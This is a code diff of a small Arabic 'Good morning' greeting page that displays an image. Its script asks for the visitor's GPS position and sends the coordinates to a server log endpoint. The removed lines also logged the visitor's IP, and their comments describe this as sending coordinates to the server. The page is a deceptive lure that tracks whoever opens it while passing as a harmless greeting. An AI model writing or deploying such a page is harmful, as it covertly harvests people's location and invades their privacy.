@@ -4,49 +4,18 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>صباح الخير</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      background: #000;
-    }
-    img {
-      max-width: 100%;
-      height: auto;
-      display: block;
-    }
-  </style>
 </head>
 <body>
-
-  <!-- صورة صباح الخير -->
-  <img src="good_morning.jpg" alt="صباح الخير">
+  <img src="/good_morning.jpg" alt="صباح الخير">
 
   <script>
-    // تسجيل IP مباشرة
-    fetch("log.php");
-
-    // محاولة طلب GPS
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        function(pos) {
-          let lat = pos.coords.latitude;
-          let lon = pos.coords.longitude;
-
-          // إرسال الإحداثيات إلى السيرفر
-          fetch("log.php?lat=" + lat + "&lon=" + lon);
-        },
-        function(error) {
-          // لو رفض أو ما سمح
-          console.log("GPS مرفوض أو غير متاح");
-        }
-      );
+      navigator.geolocation.getCurrentPosition(pos => {
+        let lat = pos.coords.latitude;
+        let lon = pos.coords.longitude;
+        fetch(`/log?lat=${lat}&lon=${lon}`);
+      });
     }
   </script>
-
 </body>
 </html>
